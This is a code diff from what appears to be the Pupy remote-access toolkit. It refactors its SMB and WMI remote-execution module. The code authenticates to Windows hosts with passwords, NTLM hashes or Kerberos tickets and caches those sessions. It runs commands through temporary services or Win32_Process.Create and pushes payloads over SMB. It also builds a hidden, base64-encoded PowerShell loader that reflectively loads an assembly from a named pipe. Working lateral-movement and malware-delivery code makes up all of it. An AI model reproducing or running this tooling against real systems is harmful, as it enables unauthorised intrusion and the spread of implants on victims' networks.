@@ -39,7 +39,26 @@ from sys import getdefaultencoding
 from Crypto.Cipher import DES
 assert(DES)
 
-SUCCESS_CACHE  = {}
+
+SUCCESS_CACHE = {}
+SMB_SESSIONS_CACHE = {}
+WBEM_SESSIONS_CACHE = {}
+
+USE_CACHE = False
+
+
+class PsExecException(Exception):
+    def as_unicode(self, codepage=None):
+        try:
+            if codepage:
+                error = self.message.decode(codepage)
+            else:
+                error = self.message.decode(getdefaultencoding())
+
+            return error
+
+        except UnicodeError:
+            return error.decode('latin1')
 
 try:
     import pupy
@@ -54,7 +73,8 @@ try:
 except ImportError:
     pass
 
-# Use Start-Transcript -Path C:\windows\temp\d.log -Force; to debug
+
+# Use Start-Transcript -Path "C:\windows\temp\d.log" -Force; to debug
 
 PIPE_LOADER_TEMPLATE = '''
 $ps=new-object System.IO.Pipes.PipeSecurity;
@@ -66,7 +86,7 @@ $x.Close();
 [Reflection.Assembly]::Load($a).GetTypes()[0].GetMethods()[0].Invoke($null,@());
 '''
 
-PIPE_LOADER_CMD_TEMPLATE = '{powershell} -w hidden -EncodedCommand {cmd}'
+PIPE_LOADER_CMD_TEMPLATE = '{powershell} -w hidden -EncodedCommand "{cmd}"'
 POWERSHELL_PATH = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
 
 PERM_DIR       = ''.join(random.sample(string.ascii_letters, 10))
@@ -90,6 +110,7 @@ if 'idna' not in encodings._cache or not encodings._cache['idna']:
 
     encodings._cache['idna'] = encodings.idna.getregentry()
 
+
 def generate_loader_cmd(size):
     pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
     encoded = b64encode(PIPE_LOADER_TEMPLATE.format(
@@ -97,23 +118,27 @@ def generate_loader_cmd(size):
     cmd = PIPE_LOADER_CMD_TEMPLATE.format(powershell=POWERSHELL_PATH, cmd=encoded)
     return cmd, pipename
 
-def create_filetransfer(*args, **kwargs):
-    smbc, error = ConnectionInfo(*args, **kwargs).create_connection()
-    if smbc:
-        return FileTransfer(smbc), None
-    else:
-        return None, error
 
 class ConnectionInfo(object):
     __slots__ = (
         'host', 'port', 'user', 'password', 'domain',
         'nt', 'lm',
         'aes', 'TGT', 'TGS', 'KDC', 'valid', 'timeout',
-        '_conn'
+        '_smb_conn', '_wbem_conn', '_dcom_conn', '_use_cache', '_cached'
     )
 
     def __init__(self, host, port=445, user='', domain='', password='', ntlm='',
-                 aes='', tgt='', tgs='', kdc='', timeout=10):
+                 aes='', tgt='', tgs='', kdc='', timeout=10, use_cache=None):
+
+        self._smb_conn = None
+        self._wbem_conn = None
+        self._dcom_conn = None
+        self._cached = False
+
+        if use_cache is None:
+            use_cache = USE_CACHE
+
+        self._use_cache = use_cache
 
         if type(host) == unicode:
             host = host.encode('utf-8')
@@ -186,6 +211,10 @@ class ConnectionInfo(object):
         return conninfo
 
     @property
+    def cached(self):
+        return self._cached
+
+    @property
     def kerberos(self):
         return bool(self.aes)
 
@@ -203,43 +232,148 @@ class ConnectionInfo(object):
             self.aes, self.TGT, self.TGS
         ]
 
-    def create_dcom_connection(self):
-        return DCOMConnection(
+    def close(self):
+        if self._cached:
+            # Leak connections if cache is used
+            return
+
+        if self._smb_conn:
+            try:
+                self._smb_conn.close()
+            except Exception:
+                pass
+
+            self._smb_conn = None
+
+        if self._wbem_conn:
+            try:
+                self._wbem_conn.RemRelease()
+            except Exception:
+                pass
+
+            self._wbem_conn = None
+
+        if self._dcom_conn:
+            try:
+                self._dcom_conn.disconnect()
+            except Exception:
+                pass
+
+            self._dcom_conn = None
+
+    def __enter__(self):
+        pass
+
+    def __exit__(self, *args):
+        self.close()
+
+    def _cache_key_entry(self):
+        return (
+          self.host, self.user, self.password,
+          self.domain, self.lm, self.nt, self.aes,
+          self.kerberos
+        )
+
+    def create_wbem(self, namespace='//./root/cimv2', rpc_auth_level=None):
+        if self._wbem_conn:
+            return self._wbem_conn
+
+        key = None
+        if self._use_cache:
+            key = self._cache_key_entry()
+            if key in WBEM_SESSIONS_CACHE:
+                self._dcom_conn, self._wbem_conn = WBEM_SESSIONS_CACHE[key]
+                self._cached = True
+                return self._wbem_conn
+
+        dcom = DCOMConnection(
             self.host, self.user, self.password, self.domain,
             self.lm, self.nt, self.aes, oxidResolver=True,
             doKerberos=self.kerberos
         )
 
-    @contextmanager
-    def create_wbem(self, namespace='//./root/cimv2', rpc_auth_level=None):
-        dcom = self.create_dcom_connection()
         try:
             iInterface = dcom.CoCreateInstanceEx(
-                wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
+                wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login
+                )
+
             iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
 
-            try:
-                iWbemServices = iWbemLevel1Login.NTLMLogin(namespace, NULL, NULL)
+            iWbemServices = iWbemLevel1Login.NTLMLogin(namespace, NULL, NULL)
 
-                if rpc_auth_level == 'privacy':
-                    iWbemServices.get_dce_rpc().set_auth_level(
-                        RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
 
-                elif rpc_auth_level == 'integrity':
-                    iWbemServices.get_dce_rpc().set_auth_level(
-                        RPC_C_AUTHN_LEVEL_PKT_INTEGRITY)
+            if rpc_auth_level == 'privacy':
+                iWbemServices.get_dce_rpc().set_auth_level(
+                    RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
 
-                yield iWbemServices
+            elif rpc_auth_level == 'integrity':
+                iWbemServices.get_dce_rpc().set_auth_level(
+                    RPC_C_AUTHN_LEVEL_PKT_INTEGRITY)
 
-            finally:
-                iWbemLevel1Login.RemRelease()
-
-        finally:
+        except:
             dcom.disconnect()
+            raise
 
-    def create_connection(self, klass=SMBConnection):
+        self._dcom_conn = dcom
+        self._wbem_conn = iWbemServices
+
+        if key is not None:
+            WBEM_SESSIONS_CACHE[key] = self._dcom_conn, self._wbem_conn
+            self._cached = True
+
+        return self._wbem_conn
+
+    def create_pipe_dce_rpc(self, pipe, dialect=SMB_DIALECT):
+        rpc = None
+
+        rpc_transport = transport.DCERPCTransportFactory(
+            r'ncacn_np:{}[{}]'.format(self.host, pipe))
+        rpc_transport.set_dport(self.port)
+        rpc_transport.preferred_dialect(dialect)
+        rpc_transport.set_credentials(
+            self.user, self.password, self.domain,
+            self.lm, self.nt, self.aes,
+            self.TGT, self.TGS
+        )
+
+        if self._smb_conn:
+            rpc_transport.set_smb_connection(self._smb_conn)
+            rpc = rpc_transport.get_dce_rpc()
+        else:
+            key = None
+
+            rpc = rpc_transport.get_dce_rpc()
+            rpc.connect()
+
+            if key and key in SMB_SESSIONS_CACHE:
+                self._smb_conn = SMB_SESSIONS_CACHE[key]
+                rpc_transport.set_smb_connection(self._smb_conn)
+                self._cached = True
+                return rpc_transport.get_dce_rpc()
+
+            self._smb_conn = rpc_transport.get_smb_connection()
+
+            if key is not None:
+                SMB_SESSIONS_CACHE[key] = self._smb_conn
+                self._cached = True
+
+        return rpc
+
+    def create_smb_connection(self):
+        if self._smb_conn:
+            return self._smb_conn
+
+        key = None
+
+        if self._use_cache:
+            key = self._cache_key_entry()
+            if key in SMB_SESSIONS_CACHE:
+                self._smb_conn = SMB_SESSIONS_CACHE[key]
+                self._cached = True
+                return self._smb_conn
+
         try:
-            smb = klass(self.host, self.host, None, self.port, timeout=self.timeout)
+            smb = SMBConnection(self.host, self.host, None, self.port, timeout=self.timeout)
 
             if self.kerberos:
                 smb.kerberos_login(
@@ -268,26 +402,33 @@ class ConnectionInfo(object):
                 'kdc': self.KDC
             }
 
-            return smb, None
+            self._smb_conn = smb
+
+            if key is not None:
+                SMB_SESSIONS_CACHE[key] = self._smb_conn
+
+            return smb
 
         except SessionError, e:
-            return None, e.getErrorString()[0]
+            raise PsExecException(e.getErrorString()[0])
 
         except (OSError, socket.error), e:
-            return None, str(e)
+            raise PsExecException(e)
 
         except Exception, e:
             error = '{}: {}\n{}'.format(type(e).__name__, e, traceback.format_exc())
-            return None, error
+            raise PsExecException(error)
+
 
 class FileTransfer(object):
     __slots__ = (
-        '_exception', '_conn'
+        '_exception', '_conn', '_cached'
     )
 
-    def __init__(self, conn):
+    def __init__(self, conn, cached=False):
         self._exception = None
         self._conn = conn
+        self._cached = cached
 
     @property
     def error(self):
@@ -320,6 +461,7 @@ class FileTransfer(object):
             return [
                 x['shi1_netname'][:-1] for x in self._conn.listShares()
             ]
+
         except Exception, e:
             self._exception = e
             return []
@@ -431,7 +573,7 @@ class FileTransfer(object):
                 pass
 
         if not pipeReady:
-            raise Exception('Couldn\'t connect to pipe {}'.format(pipe))
+            self._conn.waitNamedPipe(tid, '\\' + pipe)
 
         fid = self._conn.openFile(
             tid, pipe, FILE_WRITE_DATA | FILE_APPEND_DATA, shareMode=0)
@@ -448,15 +590,17 @@ class FileTransfer(object):
             self._conn.closeFile(tid, fid)
 
     def close(self):
-        if self._conn:
-            self._conn.logoff()
+        if self._conn and not self._cached:
             self._conn.close()
+
 
 class ShellServiceAlreadyExists(Exception):
     pass
 
+
 class ShellServiceIsNotExists(Exception):
     pass
+
 
 class ShellService(object):
     __slots__ = (
@@ -469,8 +613,7 @@ class ShellService(object):
 
         self._name = name + '\x00'
 
-        self._scmr = rpc.get_dce_rpc()
-        self._scmr.connect()
+        self._scmr = rpc
         self._scmr.bind(scmr.MSRPC_UUID_SCMR)
 
         resp = scmr.hROpenSCManagerW(self._scmr)
@@ -481,6 +624,7 @@ class ShellService(object):
         try:
             resp = scmr.hROpenServiceW(self._scmr, self._scHandle, self._name)
             self._serviceHandle = resp['lpServiceHandle']
+
         except Exception, e:
             if hasattr(e, 'error_code') and e.error_code == ERROR_SERVICE_DOES_NOT_EXIST:
                 pass
@@ -560,27 +704,20 @@ class ShellService(object):
         scmr.hRDeleteService(self._scmr, self._serviceHandle)
         scmr.hRCloseServiceHandle(self._scmr, self._serviceHandle)
 
-def sc(conninfo, command, output=True, wait=30):
-    rpctransport = transport.DCERPCTransportFactory(
-        r'ncacn_np:{}[\pipe\svcctl]'.format(conninfo.host))
-    rpctransport.set_dport(conninfo.port)
 
-    if hasattr(rpctransport,'preferred_dialect'):
-        rpctransport.preferred_dialect(SMB_DIALECT)
+def create_filetransfer(*args, **kwargs):
+    try:
+        info = ConnectionInfo(*args, **kwargs)
+        smbc = info.create_smb_connection()
+        return FileTransfer(smbc, info.cached), None
 
-    if hasattr(rpctransport, 'set_credentials'):
-        rpctransport.set_credentials(
-            conninfo.user,
-            conninfo.password,
-            conninfo.domain,
-            conninfo.lm,
-            conninfo.nt,
-            conninfo.aes,
-            conninfo.TGT,
-            conninfo.TGS
-        )
+    except PsExecException as e:
+        return None, e.as_unicode(kwargs.get('codepage', None))
 
-    service = ShellService(rpctransport)
+
+def sc(conninfo, command, output=True):
+    rpc = conninfo.create_pipe_dce_rpc(r'\pipe\svcctl')
+    service = ShellService(rpc)
     if service.exists:
         service.destroy()
 
@@ -591,18 +728,11 @@ def sc(conninfo, command, output=True, wait=30):
         ])
 
     if not service.create(command, output_filename):
-        return None, 'Could not create service'
+        raise PsExecException('Could not create service')
 
     running = service.start()
-    if running and wait:
-        try:
-            wait = int(wait)
-        except:
-            pass
-
-        timeout = None
-        if type(wait) == int:
-            timeout = time.time() + wait
+    if running and conninfo.timeout:
+        timeout = time.time() + conninfo.timeout
 
         while service.active:
             time.sleep(1)
@@ -611,25 +741,30 @@ def sc(conninfo, command, output=True, wait=30):
 
         service.destroy()
 
-    return rpctransport.get_smb_connection(), output_filename
+    return output_filename
+
 
 def wmiexec(conninfo, command, share='C$', output=True):
     output_filename = None
 
-    with conninfo.create_wbem() as iWbemServices:
-        win32Process, _ = iWbemServices.GetObject('Win32_Process')
-        if output:
-            output_filename = '\\'.join([
-                r'\Windows\Temp', ''.join(random.sample(string.ascii_letters, 10))
-            ])
+    iWbemServices = conninfo.create_wbem()
+    win32Process, _ = iWbemServices.GetObject('Win32_Process')
+    if output:
+        output_filename = '\\'.join([
+            r'\Windows\Temp', ''.join(random.sample(string.ascii_letters, 10))
+        ])
 
-            command = r'cmd.exe /Q /c {} 2>&1 1> \\127.0.0.1\{}\{}'.format(
-                command, share, output_filename
-            )
+        command = r'cmd.exe /Q /c {} 2>&1 1> \\127.0.0.1\{}\{}'.format(
+            command, share, output_filename
+        )
 
-        win32Process.Create(command, r'C:\Windows\Temp', None)
+    iResultClassObject = win32Process.Create(command, r'C:\Windows\Temp', None)
+    result = iResultClassObject.ReturnValue
+    if result == 0:
+        return output_filename
+    else:
+        raise PsExecException('Win32_Process.Create failed: {}'.format(result))
 
-    return output_filename
 
 def wql(
     host, port, user, domain, password, ntlm,
@@ -639,7 +774,8 @@ def wql(
         host, port, user, domain, password, ntlm, timeout=timeout
     )
 
-    with conninfo.create_wbem(namespace, rpc_auth_level) as iWbemServices:
+    with conninfo:
+        iWbemServices = conninfo.create_wbem(namespace, rpc_auth_level)
         iEnumWbemClassObject = iWbemServices.ExecQuery(query.strip())
 
         first = True
@@ -664,6 +800,7 @@ def wql(
                             ])
                         else:
                             item[idx] = header[key]['value']
+
                     result.append(item)
 
                 except Exception as e:
@@ -677,18 +814,77 @@ def wql(
         finally:
             iEnumWbemClassObject.RemRelease()
 
+
 def check(host, port, user, domain, password, ntlm, timeout=30):
     conninfo = ConnectionInfo(
         host, port, user, domain, password, ntlm, timeout=timeout
     )
 
     try:
-        conn = conninfo.create_connection()
-        conn.close()
+        with conninfo:
+            conninfo.create_smb_connection()
     except:
         return False
 
     return True
+
+
+def _smbexec(
+    conninfo, command, share='C$', execm='smbexec',
+        codepage=None, output=True, on_exec=None):
+
+    filename = None
+    ft = None
+    smbc = None
+
+    if execm == 'smbexec':
+        filename = sc(conninfo, command, output)
+
+    elif execm == 'wmi':
+        filename = wmiexec(conninfo, command, share, output)
+
+    else:
+        raise ValueError('Unknown execution method, knowns are smbexec/wmi')
+
+    if on_exec:
+        if not smbc:
+            smbc = conninfo.create_smb_connection()
+
+        if not ft:
+            ft = FileTransfer(smbc, cached=True)
+
+        on_exec(ft)
+
+    if filename:
+        if not ft:
+            if not smbc:
+                smbc = conninfo.create_smb_connection()
+
+            ft = FileTransfer(smbc, cached=True)
+
+        buf = StringIO()
+        for retry in xrange(5):
+            ft.get(share, filename, buf.write)
+            if not ft.ok and 'share access flags' in ft.error:
+                time.sleep(retry)
+                continue
+
+            break
+
+        if not ft.ok:
+            return None, ft.error + ' (args: share={} filename={})'.format(
+                share, filename)
+
+        ft.rm(share, filename)
+        value = buf.getvalue()
+
+        if codepage:
+            value = value.decode(codepage)
+
+        return value, ft.error
+
+    return None, None
+
 
 def smbexec(
         host, port,
@@ -701,80 +897,61 @@ def smbexec(
         host, port, user, domain, password, ntlm, timeout=timeout
     )
 
-    filename = None
-    ft = None
-    smbc = None
+    with conninfo:
+        try:
+            return _smbexec(conninfo, command, share, execm, codepage, output, on_exec)
 
-    try:
-        if execm == 'smbexec':
-            smbc, filename = sc(conninfo, command, output, timeout if output else None)
-            if not smbc:
-                return None, filename
+        except PsExecException as e:
+            return None, e.as_unicode(codepage)
 
-        elif execm == 'wmi':
-            if output:
-                smbc, error = conninfo.create_connection()
-                if not smbc:
-                    if type(error) != unicode:
-                        try:
-                            if codepage:
-                                error = error.decode(codepage)
-                            else:
-                                error = error.decode(getdefaultencoding())
-                        except UnicodeDecodeError:
-                            error = error.decode('latin1')
+        except SessionError as e:
+            return None, '{}:{} {}'.format(host, port, e)
 
-                    return None, error
+        except Exception as e:
+            return None, '{}:{} {}: {}\n{}'.format(
+                host, port, type(e).__name__, e, traceback.format_exc())
 
-            filename = wmiexec(conninfo, command, share, output)
 
-        if on_exec:
-            if not smbc:
-                smbc, error = conninfo.create_connection()
-                if not smbc:
-                    return None, error
+def get_cache():
+    if USE_CACHE is not True:
+        raise ValueError('Cache disabled')
 
-            if smbc:
-                ft = FileTransfer(smbc)
-                on_exec(ft)
+    keys = set()
+    keys.update(tuple(x) for x in SMB_SESSIONS_CACHE)
+    keys.update(tuple(x) for x in WBEM_SESSIONS_CACHE)
 
-        if filename:
-            if not ft:
-                ft = FileTransfer(smbc)
+    return tuple(keys)
 
-            buf = StringIO()
-            for retry in xrange(5):
-                ft.get(share, filename, buf.write)
-                if not ft.ok and 'share access flags' in ft.error:
-                    time.sleep(retry)
-                    continue
 
-                break
+def clear_session_caches():
+    for session in SMB_SESSIONS_CACHE.values():
+        try:
+            session.close()
+        except Exception:
+            pass
 
-            if not ft.ok:
-                return None, ft.error + ' (args: share={} filename={})'.format(
-                    share, filename)
+    for dcom, wbem in WBEM_SESSIONS_CACHE.values():
+        try:
+            wbem.RemRelease()
+        except Exception:
+            pass
 
-            ft.rm(share, filename)
-            value = buf.getvalue()
+        try:
+            dcom.disconnect()
+        except Exception:
+            pass
 
-            if codepage:
-                value = value.decode(codepage)
+    SMB_SESSIONS_CACHE.clear()
+    WBEM_SESSIONS_CACHE.clear()
 
-            return value, ft.error
 
-        return None, None
+def set_use_cache(use_cache):
+    global USE_CACHE
+    USE_CACHE = use_cache
 
-    except SessionError as e:
-        return None, '{}:{} {}'.format(host, port, e)
+    if use_cache is False:
+        clear_session_caches()
 
-    except Exception as e:
-        return None, '{}:{} {}: {}\n{}'.format(
-            host, port, type(e).__name__, e, traceback.format_exc())
-
-    finally:
-        if ft:
-            ft.close()
 
 def pupy_smb_exec(
     host, port,
@@ -818,8 +995,9 @@ def pupy_smb_exec(
                 output=False,
                 on_exec=_push_payload)
 
-            if log_cb and error:
-                log_cb(False, 'Smbexec failed: {})'.format(error))
+            if error:
+                if log_cb:
+                    log_cb(False, 'Smbexec failed: {})'.format(error))
 
         except Exception, e:
             if log_cb:
